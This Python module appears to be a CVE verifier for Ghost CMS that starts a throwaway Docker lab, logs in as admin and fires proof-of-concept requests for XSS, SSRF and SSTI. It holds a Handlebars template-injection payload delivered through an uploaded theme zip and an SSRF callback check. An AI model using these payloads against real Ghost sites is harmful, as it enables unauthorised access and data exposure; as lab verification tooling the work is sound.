"""Dynamic verifier for Ghost CMS CVEs (XSS, SSRF, missing-auth, path-traversal, SSTI).

Ghost uses a modern Node.js architecture with a JSON Admin API (Bearer token auth)
and a Content API (key-based). This verifier:
  1. Spins up an ephemeral Ghost + SQLite Docker lab
  2. Authenticates via POST /ghost/api/admin/session (email+password)
  3. Fires the PoC against the Admin or Content API
  4. Checks confirm_string in response body

Supported vuln classes: xss, ssrf, missing-authorization, path-traversal, sqli, ssti.
"""
from __future__ import annotations

import io
import json
import os
import re
import subprocess
import time
import zipfile
from typing import Callable, Optional

from .wpverify import WpVerifyResult, _docker_daemon_ok, _http_request, _run, _lab_host
from .genericverify import _build_json_params

_GHOST_IMAGE = "ghost:5-alpine"
_GHOST_PORT = 2368
_GHOST_ADMIN_EMAIL = "binoracle@test.local"
_GHOST_ADMIN_PASSWORD = "Binoracle123!Test"
_GHOST_TITLE = "binoracle-test"


def _ghost_wait_ready(base_url: str, timeout: int = 60, step=None) -> bool:
    """Poll Ghost health endpoint until ready."""
    _step = step or (lambda m: None)
    health_url = base_url + "/ghost/api/admin/site/"
    for _i in range(timeout):
        try:
            r = _http_request("GET", health_url, timeout=3)
            if r.status_code in (200, 401, 403):
                _step("  ghost: servidor listo")
                return True
        except Exception:
            pass
        time.sleep(1)
    _step("  ghost: timeout esperando servidor")
    return False


def _ghost_setup(container: str, base_url: str, step) -> bool:
    """Create Ghost admin user via CLI and return True on success."""
    setup_url = base_url + "/ghost/api/admin/authentication/setup/"
    try:
        r = _http_request("POST", setup_url,
                          data=json.dumps({"setup": [{
                              "name": "binoracle",
                              "email": _GHOST_ADMIN_EMAIL,
                              "password": _GHOST_ADMIN_PASSWORD,
                              "blogTitle": _GHOST_TITLE,
                          }]}),
                          headers={"Content-Type": "application/json",
                                   "Origin": base_url},
                          timeout=15)
        if r.status_code in (200, 201):
            step("  ghost: admin setup OK")
            return True
        if r.status_code == 403:
            step("  ghost: ya configurado, intentando login directo")
            return True
    except Exception as e:
        step(f"  ghost: setup error — {e}")
    return False


def _ghost_get_token(base_url: str, step) -> str:
    """Login to Ghost admin and return session cookie string."""
    session_url = base_url + "/ghost/api/admin/session/"
    try:
        r = _http_request("POST", session_url,
                          data=json.dumps({"username": _GHOST_ADMIN_EMAIL,
                                           "password": _GHOST_ADMIN_PASSWORD}),
                          headers={"Content-Type": "application/json",
                                   "Origin": base_url},
                          timeout=10)
        if r.status_code in (200, 201):
            cookie_hdr = r.headers.get("set-cookie", "")
            m = re.search(r"ghost-admin-api-session=([^;]+)", cookie_hdr)
            if m:
                step("  ghost: session cookie obtenida")
                return f"ghost-admin-api-session={m.group(1)}"
    except Exception as e:
        step(f"  ghost: login error — {e}")
    return ""


def _ghost_get_content_api_key(base_url: str, auth_cookie: str, step) -> str:
    """Create a Ghost Content API integration and return the key secret.

    Uses the Admin API to create an integration named 'binoracle-test' and
    extracts the first Content Integration API key from the response.
    """
    url = base_url + "/ghost/api/admin/integrations/"
    headers = {
        "Content-Type": "application/json",
        "Cookie": auth_cookie,
        "Origin": base_url,
    }
    try:
        r = _http_request("POST", url,
                          data=json.dumps({"integrations": [{"name": "binoracle-test"}]}),
                          headers=headers, timeout=10)
        if r.status_code in (200, 201):
            body = json.loads(r.text or "{}")
            integrations = body.get("integrations") or []
            if integrations:
                for key in (integrations[0].get("api_keys") or []):
                    if key.get("type") == "content":
                        secret = key.get("secret", "")
                        if secret:
                            step(f"  ghost: Content API key obtenida ({secret[:8]}…)")
                            return secret
    except Exception as e:
        step(f"  ghost: content api key error — {e}")
    return ""


def _ghost_run_request_chain(base_url: str, chain: list,
                              auth_cookie: str, step) -> tuple:
    """Execute a multi-step request chain against Ghost.

    Each step dict: method, endpoint, body (JSON string), headers, extract, confirm_string.
    'extract' maps var_name -> 'json:path.to.field' or a regex pattern.
    '{{var}}' placeholders in endpoint/body are substituted with extracted values.
    Returns (verified: bool, detail: str, evidence: dict).
    """
    import re as _re
    vars_: dict = {}

    def _substitute(text: str) -> str:
        for k, v in vars_.items():
            text = text.replace("{{" + k + "}}", str(v))
        return text

    def _extract_json_path(obj, path: str):
        for part in path.split("."):
            if isinstance(obj, dict):
                obj = obj.get(part)
            else:
                return None
        return obj

    final_evidence: dict = {}
    for idx, step_def in enumerate(chain):
        method = step_def.get("method", "GET").upper()
        ep = _substitute(step_def.get("endpoint", "/"))
        url = base_url.rstrip("/") + ep
        hdrs = {k: _substitute(str(v)) for k, v in (step_def.get("headers") or {}).items()}
        # Ghost uses Cookie auth by default
        if auth_cookie and "Cookie" not in hdrs and "Authorization" not in hdrs:
            hdrs["Cookie"] = auth_cookie
        hdrs.setdefault("Origin", base_url)
        body_str = _substitute(step_def.get("body") or "{}")
        try:
            body_obj = json.loads(body_str)
            body_data = json.dumps(body_obj)
            hdrs.setdefault("Content-Type", "application/json")
        except Exception:
            body_data = body_str

        step(f"  ghost chain[{idx}]: {method} {ep}")
        try:
            multipart_fields = step_def.get("multipart_fields")
            if multipart_fields:
                import requests as _req_mp
                mp_files = {}
                for field_name, field_def in multipart_fields.items():
                    if isinstance(field_def, dict) and "content" in field_def:
                        content = field_def["content"]
                        if isinstance(content, str):
                            content = _substitute(content).encode()
                        mp_files[field_name] = (
                            field_def.get("filename"),
                            content,
                            field_def.get("content_type", "text/plain"),
                        )
                    elif isinstance(field_def, dict) and "value" in field_def:
                        mp_files[field_name] = (None, _substitute(str(field_def["value"])))
                    else:
                        mp_files[field_name] = (None, _substitute(str(field_def)))
                extra_hdrs = {k: v for k, v in hdrs.items() if k != "Content-Type"}
                r = _req_mp.request(method, url, files=mp_files, headers=extra_hdrs, timeout=30)
            else:
                r = _http_request(method, url,
                                  data=body_data if method in ("POST", "PUT", "PATCH") else None,
                                  headers=hdrs, timeout=20)
        except Exception as exc:
            return False, f"chain[{idx}] request error: {exc}", {}

        status = r.status_code
        body_text = r.text or ""

        if step_def.get("extract"):
            resp_obj = None
            try:
                resp_obj = json.loads(body_text)
            except Exception:
                pass
            for var_name, path_expr in step_def["extract"].items():
                if path_expr.startswith("json:"):
                    if resp_obj is not None:
                        val = _extract_json_path(resp_obj, path_expr[5:])
                        if val is not None:
                            vars_[var_name] = val
                            step(f"  ghost chain[{idx}]: extracted {var_name}={str(val)[:40]}")
                else:
                    try:
                        m = _re.search(path_expr, body_text)
                        if m:
                            vars_[var_name] = m.group(1)
                            step(f"  ghost chain[{idx}]: extracted {var_name}={vars_[var_name][:40]!r}")
                    except Exception:
                        pass

        expect_status = step_def.get("confirm_status")
        if expect_status and status != expect_status:
            step(f"  ghost chain[{idx}]: HTTP {status} != {expect_status}")
            return False, f"chain[{idx}] HTTP {status} != expected {expect_status}", {}

        cs = step_def.get("confirm_string", "")
        is_final = step_def.get("is_final", idx == len(chain) - 1)
        if is_final:
            final_evidence = {"status": status, "body_snippet": body_text[:300], "vars": vars_}
            if cs:
                if cs in body_text:
                    return True, f"VERIFICADO: '{cs}' en respuesta Ghost (chain)", final_evidence
                return False, f"chain final: '{cs}' no encontrado — HTTP {status}", final_evidence
            return True, f"chain final: HTTP {status} OK (no confirm_string)", final_evidence

    return False, "request_chain vacío", {}


def _build_theme_zip(payload: str) -> bytes:
    """Build a minimal Ghost theme zip with a Handlebars template containing payload.

    Returns raw zip bytes ready for multipart upload to /ghost/api/admin/themes/upload.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("test/package.json",
                    json.dumps({"name": "test", "version": "1.0.0"}))
        # index.hbs is the homepage template — payload goes inside a <div>
        zf.writestr("test/index.hbs",
                    f"<!DOCTYPE html><html><head></head><body>{payload}</body></html>")
        # Ghost requires at least these two templates to activate a theme
        zf.writestr("test/post.hbs",
                    "<!DOCTYPE html><html><head></head><body>{{body_html}}</body></html>")
    return buf.getvalue()


def verify_ghost_ssti(
    source_path: str,
    payload: str = "{{#each @root}}{{@key}}:{{this}},{{/each}}",
    confirm_string: str = "",
    docker_image: str = "",
    on_step: Optional[Callable] = None,
    budget_s: float = 300.0,
) -> WpVerifyResult:
    """Verify Ghost Handlebars SSTI by injecting a theme template.

    Flow:
    1. Spin up Ghost lab
    2. Auth as admin → session cookie
    3. Upload zip with malicious .hbs template via /ghost/api/admin/themes/upload
    4. Activate theme via PUT /ghost/api/admin/settings/
    5. GET / and check for confirm_string (or payload reflection)
    """
    step = on_step or print
    res = WpVerifyResult()

    if not _docker_daemon_ok():
        res.detail = "Docker no disponible"
        return res

    _image = docker_image if docker_image else _GHOST_IMAGE
    container = f"bo_ghost_ssti_{os.urandom(4).hex()}"
    network = f"bo_ghost_ssti_net_{os.urandom(4).hex()}"

    try:
        import time as _time
        _net_err = ""
        for _att in range(3):
            r_net = subprocess.run(["docker", "network", "create", network],
                                   capture_output=True, timeout=15)
            if r_net.returncode == 0:
                break
            _net_err = (r_net.stderr or b"").decode(errors="replace").strip()
            if _att < 2:
                _time.sleep(3)
        else:
            res.detail = f"docker network create failed: {_net_err}"
            return res

        step(f"  ghost-ssti: arrancando {_image}…")
        _run(["docker", "run", "-d", "--rm", "--name", container,
              "--network", network,
              "-p", f"{_GHOST_PORT}:{_GHOST_PORT}",
              "-e", f"url=http://localhost:{_GHOST_PORT}",
              "-e", "database__client=sqlite3",
              "-e", "database__connection__filename=/var/lib/ghost/content/data/ghost.db",
              "-e", "NODE_ENV=development",
              _image], timeout=30)

        host = _lab_host()
        base_url = f"http://{host}:{_GHOST_PORT}"
        _timeout = 120 if ("ghost:6" in _image or "ghost:7" in _image) else 90
        if not _ghost_wait_ready(base_url, timeout=_timeout, step=step):
            res.detail = "Ghost no arrancó a tiempo"
            return res

        _ghost_setup(container, base_url, step)
        time.sleep(2)
        auth_cookie = _ghost_get_token(base_url, step)
        if not auth_cookie:
            res.detail = "Ghost SSTI: no se pudo obtener session cookie"
            return res

        # Upload theme zip
        import requests as _req
        theme_zip = _build_theme_zip(payload)
        step("  ghost-ssti: subiendo tema con payload Handlebars…")
        upload_r = _req.post(
            base_url + "/ghost/api/admin/themes/upload",
            files={"theme": ("test.zip", theme_zip, "application/zip")},
            headers={"Cookie": auth_cookie, "Origin": base_url},
            timeout=20,
        )
        res.evidence["theme_upload_status"] = upload_r.status_code
        res.evidence["theme_upload_body"] = upload_r.text[:200]
        if upload_r.status_code not in (200, 201):
            res.detail = f"ghost-ssti: upload fallido HTTP {upload_r.status_code}"
            res.ok = True
            return res

        step("  ghost-ssti: activando tema 'test'…")
        activate_r = _req.put(
            base_url + "/ghost/api/admin/settings/",
            json={"settings": [{"key": "active_theme", "value": "test"}]},
            headers={"Cookie": auth_cookie, "Origin": base_url,
                     "Content-Type": "application/json"},
            timeout=10,
        )
        res.evidence["theme_activate_status"] = activate_r.status_code

        # Fetch homepage and check
        for _path in ("/", "/?page=1"):
            try:
                home_r = _http_request("GET", base_url + _path, timeout=10)
                body_text = home_r.text or ""
                check = confirm_string if confirm_string else payload
                if check and check in body_text:
                    res.verified = True
                    res.ok = True
                    res.confidence = "confirmed"
                    res.detail = f"Ghost SSTI VERIFICADO: '{check[:60]}' en respuesta homepage"
                    res.evidence["ssti_body_snippet"] = body_text[:400]
                    step("  ghost-ssti: VERIFICADO")
                    return res
            except Exception:
                continue

        res.ok = True
        res.detail = "ghost-ssti: tema subido y activado pero payload no reflejado en homepage"
        res.evidence["payload_used"] = payload[:200]

    except subprocess.CalledProcessError as e:
        res.detail = f"Docker error: {e}"
    except Exception as e:
        res.detail = f"Error: {e}"
    finally:
        try:
            subprocess.run(["docker", "rm", "-f", container], capture_output=True, timeout=10)
            subprocess.run(["docker", "network", "rm", network], capture_output=True, timeout=10)
        except Exception:
            pass

    return res


def verify_ghost_cve(
    source_path: str,
    endpoint: str,
    vuln_class: str = "xss",
    http_method: str = "GET",
    parameters: Optional[list] = None,
    payload: str = "",
    confirm_string: str = "",
    auth_required: bool = True,
    docker_image: str = "",
    request_chain: Optional[list] = None,
    on_step: Optional[Callable] = None,
    budget_s: float = 240.0,
) -> WpVerifyResult:
    """Verify a Ghost CMS CVE dynamically.

    Spins up Ghost in Docker, sets up admin, fires PoC, checks confirm_string.
    Supports multi-step request_chain for chained exploits.
    """
    step = on_step or print
    res = WpVerifyResult()

    if not _docker_daemon_ok():
        res.detail = "Docker no disponible"
        return res

    _image = docker_image if docker_image else _GHOST_IMAGE
    container = f"bo_ghost_{os.urandom(4).hex()}"
    network = f"bo_ghost_net_{os.urandom(4).hex()}"

    try:
        # Create isolated network with retry for Docker daemon race conditions
        import time as _time
        _net_err = ""
        for _att in range(3):
            r_net = subprocess.run(["docker", "network", "create", network],
                                   capture_output=True, timeout=15)
            if r_net.returncode == 0:
                break
            _net_err = (r_net.stderr or b"").decode(errors="replace").strip()
            if _att < 2:
                _time.sleep(3)
        else:
            res.detail = f"docker network create failed: {_net_err}"
            return res

        step(f"  ghost: arrancando {_image} en puerto {_GHOST_PORT}…")
        _run(["docker", "run", "-d", "--rm", "--name", container,
              "--network", network,
              "-p", f"{_GHOST_PORT}:{_GHOST_PORT}",
              "-e", f"url=http://localhost:{_GHOST_PORT}",
              "-e", "database__client=sqlite3",
              "-e", "database__connection__filename=/var/lib/ghost/content/data/ghost.db",
              "-e", "NODE_ENV=development",
              _image], timeout=30)

        host = _lab_host()
        base_url = f"http://{host}:{_GHOST_PORT}"

        _ghost_start_timeout = 120 if ("ghost:6" in _image or "ghost:7" in _image) else 90
        if not _ghost_wait_ready(base_url, timeout=_ghost_start_timeout, step=step):
            res.detail = "Ghost no arrancó a tiempo"
            return res

        _ghost_setup(container, base_url, step)
        time.sleep(2)

        auth_cookie = ""
        if auth_required or request_chain:
            auth_cookie = _ghost_get_token(base_url, step)

        # Multi-step chain takes priority
        if request_chain:
            verified, detail, evidence = _ghost_run_request_chain(
                base_url, request_chain, auth_cookie, step)
            res.verified = verified
            res.ok = verified
            res.confidence = "confirmed" if verified else "failed"
            res.detail = detail
            res.evidence.update(evidence)
            if verified:
                step("  ghost: VERIFICADO (chain)")
            return res

        # SSRF: start a callback listener in the Ghost Docker network.
        # Ghost fetches the SSRF target URL server-side — we confirm receipt at the listener.
        if vuln_class == "ssrf":
            import secrets as _secrets
            token = _secrets.token_hex(12)
            # Start a minimal HTTP listener container in Ghost's network
            listener_name = f"bo_ghost_listener_{os.urandom(4).hex()}"
            listener_port = 9988
            # Listener responds with HTML that contains a link to Ghost's base URL so
            # Ghost's webmention validator accepts the source page as a valid webmention.
            _listener_cmd = (
                f"python3 -c \""
                f"import http.server,socketserver;"
                f"class H(http.server.BaseHTTPRequestHandler):"
                f"  def do_GET(self):"
                f"    body=b'<html><body><a href=\\\"{base_url}/\\\">link</a></body></html>';"
                f"    self.send_response(200);"
                f"    self.send_header('Content-Type','text/html');"
                f"    self.send_header('Content-Length',str(len(body)));"
                f"    self.end_headers();"
                f"    self.wfile.write(body);"
                f"    print('CALLBACK:'+self.path,flush=True);"
                f"  def log_message(self,*a):pass;"
                f"socketserver.TCPServer(('0.0.0.0',{listener_port}),H).handle_request()\""
            )
            _run(["docker", "run", "-d", "--rm", "--name", listener_name,
                  "--network", network,
                  "python:3.11-slim", "sh", "-c", _listener_cmd], timeout=20)
            time.sleep(1)
            # Build SSRF payload: replace any URL param value with the internal callback URL
            # Ghost's webmentions use "source" param; fallback to "url"
            from .wpverify import _URL_HINTS as _GH_URL_HINTS
            from .genericverify import _pick_param as _gh_pick_param
            _params = parameters or []
            _url_p = _gh_pick_param(_params, _GH_URL_HINTS) or "source"
            callback_url = f"http://{listener_name}:{listener_port}/?token={token}"
            _ssrf_params = dict(_params) if isinstance(_params, dict) else {}
            if isinstance(_params, list):
                _ssrf_params = dict.fromkeys(_params, "")
            _ssrf_params[_url_p] = callback_url
            # Keep target pointing at Ghost's own homepage so it's a valid webmention target
            if "target" in _ssrf_params and "target" != _url_p:
                _ssrf_params["target"] = base_url + "/"
            ssrf_body = json.dumps(_ssrf_params)
            ssrf_headers: dict = {"Content-Type": "application/json", "Origin": base_url}
            if auth_cookie:
                ssrf_headers["Cookie"] = auth_cookie
            step(f"  ghost/ssrf: enviando callback URL a {endpoint} (url_param={_url_p!r})")
            try:
                r_ssrf = _http_request(
                    http_method.upper() if http_method else "POST",
                    base_url + endpoint, data=ssrf_body,
                    headers=ssrf_headers, timeout=15)
                res.evidence["ssrf_status"] = r_ssrf.status_code
                res.evidence["ssrf_body"] = (r_ssrf.text or "")[:200]
            except Exception as _ssrf_e:
                res.evidence["ssrf_error"] = str(_ssrf_e)[:100]
            # Wait for Ghost to fetch the callback URL (async processing)
            # Ghost processes webmentions asynchronously; 20s is insufficient for 5.x.
            _got_callback = False
            for _w in range(45):
                time.sleep(1)
                try:
                    _logs = subprocess.run(
                        ["docker", "logs", listener_name],
                        capture_output=True, text=True, timeout=5)
                    _log_out = (_logs.stdout or "") + (_logs.stderr or "")
                    if "CALLBACK:" in _log_out or token in _log_out:
                        _got_callback = True
                        res.evidence["callback_received"] = _log_out.strip()[:200]
                        break
                except Exception:
                    break
            subprocess.run(["docker", "rm", "-f", listener_name],
                           capture_output=True, timeout=10)
            if _got_callback:
                res.verified = True
                res.ok = True
                res.confidence = "confirmed"
                res.detail = f"SSRF VERIFICADO: Ghost fetched callback URL (token={token[:8]}…)"
                step("  ghost/ssrf: VERIFICADO — callback recibido")
            else:
                res.ok = True
                res.detail = (f"SSRF no confirmado: Ghost no fetched callback en 45s "
                              f"(HTTP {res.evidence.get('ssrf_status','?')})")
                step("  ghost/ssrf: no callback recibido en 45s")
            return res

        # Single-request PoC
        target_url = base_url + endpoint
        headers: dict = {}
        if auth_cookie:
            headers["Cookie"] = auth_cookie
        headers["Origin"] = base_url

        body, target_url, headers = _build_json_params(
            parameters, payload, http_method, target_url, headers)

        step(f"  ghost: {http_method} {target_url}")
        r = _http_request(http_method.upper(), target_url,
                          data=body, headers=headers, timeout=15)
        res.evidence["status"] = r.status_code
        res.evidence["body_snippet"] = (r.text or "")[:300]
        res.evidence["endpoint"] = target_url

        if r.status_code in (200, 201):
            if confirm_string and confirm_string in (r.text or ""):
                res.verified = True
                res.ok = True
                res.confidence = "confirmed"
                res.detail = f"VERIFICADO: '{confirm_string}' en respuesta Ghost"
                step("  ghost: VERIFICADO")
            elif not confirm_string and payload and payload in (r.text or ""):
                res.ok = True
                res.confidence = "probable"
                res.evidence["not_verified_reason"] = (
                    "payload reflejado en la respuesta no es prueba de ejecucion ni de explotacion -- muchos endpoints benignos reflejan el input del atacante (mensajes de error, formularios re-renderizados, busquedas, logs) sin que eso implique que el payload se ejecuto o que la vulnerabilidad es real")
                res.detail = "LEAD (no confirmado): payload reflejado en respuesta"
                step("  ghost: payload reflejado (lead, no confirmado)")
            else:
                res.ok = True
                res.detail = "HTTP 200 — confirm_string no encontrado"
        else:
            res.detail = f"HTTP {r.status_code} — endpoint no accesible"

    except subprocess.CalledProcessError as e:
        res.detail = f"Docker error: {e}"
    except Exception as e:
        res.detail = f"Error: {e}"
    finally:
        try:
            subprocess.run(["docker", "rm", "-f", container],
                           capture_output=True, timeout=10)
            subprocess.run(["docker", "network", "rm", network],
                           capture_output=True, timeout=10)
        except Exception:
            pass

    return res


# Convenience aliases
verify_ghost_xss = verify_ghost_cve
